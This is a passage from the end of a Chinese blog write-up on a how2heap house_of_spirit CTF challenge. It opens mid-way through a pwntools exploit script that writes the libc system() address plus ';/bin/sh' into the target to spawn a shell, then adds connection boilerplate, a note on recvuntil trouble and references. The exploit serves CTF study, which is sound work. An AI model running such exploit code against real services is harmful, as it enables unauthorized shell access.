</span></span><span class=line><span class=cl>    <span class=n>system_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;system&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>leave_message</span><span class=p>(</span><span class=n>p32</span><span class=p>(</span><span class=n>system_addr</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;;/bin/sh&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>argc</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>locallibc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>exp</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=存在的疑问>存在的疑问&mldr;</h2><p>pwntools的recvuntil等函数无法正常使用，无论是最新开发版，还是稳定版本。</p><h2 id=ref>ref</h2><ol><li>how2heap house_of_spirit.c</li><li><a href=https://www.anquanke.com/post/id/85357>https://www.anquanke.com/post/id/85357</a></li></ol></div><div class=post-copyright><p class=copyright-item><span class=item-title>文章作者</span>
<span class=item-content>hhdx</span></p><p class=copyright-item><span class=item-title>上次更新</span>
<span class=item-content>2020-07-01</span></p></div><footer class=post-footer><div class=post-tags><a href=/tags/how2heap/>how2heap</a>
<a href=/tags/ctf/>CTF</a></div><nav class=post-nav><a class=prev href=/post/how2heap-poison-null-byte-plaidctf2015-plaiddb/><i class="iconfont icon-left"></i>
<span class="prev-text nav-default">How2heap--poison_null_byte Plaidctf2015--plaiddb</span>
<span class="prev-text nav-mobile">上一篇</span></a>
<a class=next href=/post/how2heap-fastbin-dup-consolidate-hitcon2016-sleepyholder/><span class="next-text nav-default">How2heap--fastbin_dup_consolidate Hitcon2016--SleepyHolder</span>
<span class="next-text nav-mobile">下一篇</span>
<i class="iconfont icon-right"></i></a></nav></footer></article></div><div id=disqus_thread></div><script type=text/javascript>(function(){if(window.location.hostname==="localhost")return;var t,e=document.createElement("script");e.type="text/javascript",e.async=!0,t="lyliuchao",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript></div></main><footer id=footer class=footer><div class=social-links><a href=https://github.com/clxsh class="iconfont icon-github" title=github></a>
<a href=https://www.douban.com/people/57285004/ class="iconfont icon-douban" title=douban></a></div><div class=copyright><span class=power-by>由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动</span>
<span class=division>|</span>
<span class=theme-info>主题 -
<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span>
<span class=copyright-year>&copy;
2016 -
2023<span class=heart><i class="iconfont icon-heart"></i></span><span>hhdx</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src="/lib/highlight/highlight.pack.js?v=20171001"></script>
<script src=https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js integrity=sha384-NXgwF8Kv9SSAr+jemKKcbvQsz+teULH/a5UNJvZc6kP47hZgl62M1vGnw6gHQhb1 crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script>
<script type=text/javascript src=/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js></script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-177325662-1","auto"),ga("set","anonymizeIp",!0),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></body></html>